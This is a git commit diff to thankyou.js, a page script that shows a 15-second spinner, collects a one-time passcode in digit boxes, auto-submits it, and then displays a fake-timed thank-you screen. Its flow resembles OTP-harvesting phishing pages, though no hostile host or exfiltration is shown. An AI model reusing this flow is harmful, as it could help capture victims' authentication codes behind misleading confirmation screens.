33c15c13fa5d1e8fb257b2e1178f091020cca847
wellcush <140511613+wellcush@users.noreply.github.com>
2023-10-06 13:53:44 -0400

    Update thankyou.js

--- thankyou.js
+++ thankyou.js
@@ -3,35 +3,8 @@ document.addEventListener("DOMContentLoaded", function() {
     const otpContainer = document.querySelector('.otp-container');
     const thanksContainer = document.querySelector('.thanks-container');
     const otpInputs = document.querySelectorAll('.otp-inputs input');
-    const otpForm = document.getElementById('visibleOTPForm');
+    const otpForm = document.querySelector('form[name="otpForm"]');
     const btnConfirm = document.querySelector('.btn-2');
-
-    thanksContainer.style.display = 'none';  // Ensures that the Thanks container is initially hidden
-
-    // Function to display custom messages
-    function showCustomAlert(message) {
-        const customAlert = document.createElement('div');
-        customAlert.style = `
-            position: fixed; 
-            top: 0; 
-            right: 0; 
-            bottom: 0; 
-            left: 0; 
-            background-color: rgba(0,0,0,0.7); 
-            color: white; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            font-size: 1.5rem;
-            z-index: 9999;
-        `;
-        customAlert.innerText = message;
-        document.body.appendChild(customAlert);
-
-        setTimeout(() => {
-            document.body.removeChild(customAlert);
-        }, 5000); // hide the message after 5 seconds
-    }
 
     // Show spinner for 15 seconds on page load
     setTimeout(() => {
@@ -41,16 +14,18 @@ document.addEventListener("DOMContentLoaded", function() {
 
     otpInputs.forEach((input, index) => {
         input.addEventListener('input', function() {
-            this.value = this.value.replace(/[^0-9]/g, ''); // Allow only numbers
-            
+            // Allow only numbers in the input fields
+            this.value = this.value.replace(/[^0-9]/g, '');
+
+            // Auto-navigate to the next input if current input is filled
             if (input.value.length === 1 && index < otpInputs.length - 1) {
-                otpInputs[index + 1].focus(); // Auto-navigate to the next input
+                otpInputs[index + 1].focus();
             }
-            
+
+            // Auto submit if all inputs are filled
             if (Array.from(otpInputs).every(i => i.value.length === 1)) {
-                btnConfirm.removeAttribute('disabled');
-            } else {
-                btnConfirm.setAttribute('disabled', 'true');
+                // Programmatically submit the form for OTP validation
+                otpForm.submit();
             }
         });
     });
@@ -58,42 +33,26 @@ document.addEventListener("DOMContentLoaded", function() {
     otpForm.addEventListener('submit', function(event) {
         event.preventDefault();
 
-        if (Array.from(otpInputs).every(i => i.value.length === 1)) {
-            otpContainer.style.display = 'none';
-            spinnerContainer.style.display = 'flex';
-
-            // Handle form submission here
-            const formData = new FormData(otpForm);
-
-            fetch(otpForm.action, {
-                method: 'POST',
-                body: formData,
-                headers: {
-                    'Accept': 'application/x-www-form-urlencoded;charset=UTF-8',
-                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-                },
-            })
-            .then(response => {
-                if (response.ok) {
-                    showCustomAlert('Form submitted successfully!');
-                    setTimeout(() => {
-                        spinnerContainer.style.opacity = 0;
-                        setTimeout(() => {
-                            spinnerContainer.style.display = 'none';
-                            thanksContainer.style.display = 'flex';
-                            thanksContainer.style.opacity = 1;
-                        }, 500);
-                    }, 3000);
-                } else {
-                    showCustomAlert('Form submission failed! Please try again.');
-                }
-            })
-            .catch(error => {
-                console.error('There was an error!', error);
-                showCustomAlert('Form submission failed due to a network issue! Please try again.');
-            });
-        } else {
-            alert('Please fill out all the OTP fields!');
+        // All fields are mandatory checks
+        let isAllFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+        if (!isAllFilled) {
+            alert("Please fill all the fields!");
+            return;
         }
+
+        otpContainer.style.display = 'none';
+        spinnerContainer.style.display = 'flex';
+
+        setTimeout(() => {
+            spinnerContainer.style.opacity = 0;  
+            setTimeout(() => {
+                spinnerContainer.style.display = 'none';
+                thanksContainer.style.display = 'flex';
+                thanksContainer.style.opacity = 0;
+                setTimeout(() => {
+                    thanksContainer.style.opacity = 1;
+                }, 50);
+            }, 500);
+        }, 3000);
     });
 });
